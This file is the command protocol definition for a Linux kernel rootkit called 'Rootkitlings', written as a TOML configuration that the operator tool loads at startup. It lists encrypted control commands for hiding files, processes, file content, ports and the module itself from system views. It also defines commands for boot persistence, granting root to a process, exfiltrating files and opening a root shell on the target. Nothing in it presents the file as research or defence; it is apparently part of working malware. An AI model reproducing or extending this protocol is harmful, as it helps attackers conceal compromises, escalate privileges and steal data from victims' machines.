# Rootkitlings control protocol
#
# Text request/reply over length-prefixed AES-256-GCM frames.
# One source of truth: the operator reads this at startup to build
# completions, help, and error messages.
#
# Handshake: after AEAD channel setup, kernel sends HELLO <version>.
# Operator checks version against this file. Mismatch = disconnect.
#
# Reply prefixes: OK, ERR, INFO, STATUS, LIST, ENTRY, FILE, EOF,
# OPEN, STATE. Every request gets exactly one reply, except DOWNLOAD
# (FILE + data frames + EOF).
#
# Errors: ERR <code>. Codes are integers defined below.

[protocol]
version = 1

# --- Errors -----------------------------------------------------------

[errors]
1  = "list full"
2  = "invalid index"
3  = "file not found"
4  = "shell busy"
5  = "shell failed"
6  = "invalid command"

# --- Session ----------------------------------------------------------

[commands.INFO]
wire    = "INFO"
reply   = "INFO <hostname> <kernel> <arch>"
help    = "target hostname, kernel, arch"
group   = "session"

[commands.STATUS]
wire    = "STATUS"
reply   = "STATUS hidden=<yes|no> persisted=<yes|no> files=<n> pids=<n> content=<n> ports=<n>"
help    = "module state and hide list counts"
group   = "view"

[commands.QUIT]
wire    = "QUIT"
reply   = ""
help    = "disconnect from target"
group   = "session"

# --- Hide -------------------------------------------------------------

[commands.HIDE_FILE]
wire    = "HIDE FILE <name>"
reply   = "OK <index> | ERR 1"
help    = "hide entries matching NAME from getdents64"
group   = "hide"

[commands.HIDE_PID]
wire    = "HIDE PID <pid>"
reply   = "OK <index> | ERR 1"
help    = "hide process from /proc"
group   = "hide"

[commands.HIDE_CONTENT]
wire    = "HIDE CONTENT <string>"
reply   = "OK <index> | ERR 1"
help    = "hide lines containing STRING from read()"
group   = "hide"

[commands.HIDE_PORT]
wire    = "HIDE PORT <port>"
reply   = "OK <index> | ERR 1"
help    = "hide local port from /proc/net/tcp"
group   = "hide"

[commands.HIDE_MODULE]
wire    = "HIDE MODULE"
reply   = "OK"
help    = "remove module from /proc/modules"
group   = "hide"

# --- Unhide -----------------------------------------------------------

[commands.UNHIDE_FILE]
wire    = "UNHIDE FILE <index>"
reply   = "OK <removed> | ERR 2"
help    = "unhide file entry by index"
group   = "unhide"

[commands.UNHIDE_PID]
wire    = "UNHIDE PID <index>"
reply   = "OK <removed> | ERR 2"
help    = "unhide pid entry by index"
group   = "unhide"

[commands.UNHIDE_CONTENT]
wire    = "UNHIDE CONTENT <index>"
reply   = "OK <removed> | ERR 2"
help    = "unhide content entry by index"
group   = "unhide"

[commands.UNHIDE_PORT]
wire    = "UNHIDE PORT <index>"
reply   = "OK <removed> | ERR 2"
help    = "unhide port entry by index"
group   = "unhide"

[commands.UNHIDE_MODULE]
wire    = "UNHIDE MODULE"
reply   = "OK"
help    = "restore module to /proc/modules"
group   = "unhide"

[commands.UNHIDE_ALL]
wire    = "UNHIDE ALL"
reply   = "OK"
help    = "clear all hide lists"
group   = "unhide"

# --- List -------------------------------------------------------------

[commands.LIST_FILE]
wire    = "LIST FILE [index]"
reply   = "LIST <count> | ENTRY <index> <value> | ERR 2"
help    = "list hidden files (or show one by index)"
group   = "list"

[commands.LIST_PID]
wire    = "LIST PID [index]"
reply   = "LIST <count> | ENTRY <index> <value> | ERR 2"
help    = "list hidden pids (or show one by index)"
group   = "list"

[commands.LIST_CONTENT]
wire    = "LIST CONTENT [index]"
reply   = "LIST <count> | ENTRY <index> <value> | ERR 2"
help    = "list hidden content strings (or show one by index)"
group   = "list"

[commands.LIST_PORT]
wire    = "LIST PORT [index]"
reply   = "LIST <count> | ENTRY <index> <value> | ERR 2"
help    = "list hidden ports (or show one by index)"
group   = "list"

# --- Operate ----------------------------------------------------------

[commands.PERSIST]
wire    = "PERSIST"
reply   = "OK"
help    = "request boot persistence"
group   = "operate"

[commands.UNPERSIST]
wire    = "UNPERSIST"
reply   = "OK"
help    = "remove boot persistence"
group   = "operate"

[commands.ESCALATE]
wire    = "ESCALATE <pid>"
reply   = "OK | ERR 6"
help    = "grant root credentials to PID"
group   = "operate"

[commands.DOWNLOAD]
wire    = "DOWNLOAD <path>"
reply   = "FILE <size> [data...] EOF | ERR 3"
help    = "exfiltrate file from target"
group   = "operate"

[commands.SHELL]
wire    = "SHELL <port>"
reply   = "OPEN <request_id> <cookie> | ERR 4 | ERR 5"
help    = "open root shell on the target"
group   = "operate"

[commands.SHELL_STATUS]
wire    = "SHELL STATUS"
reply   = "STATE <request_id> <state> <result>"
help    = "check shell state"
group   = "operate"
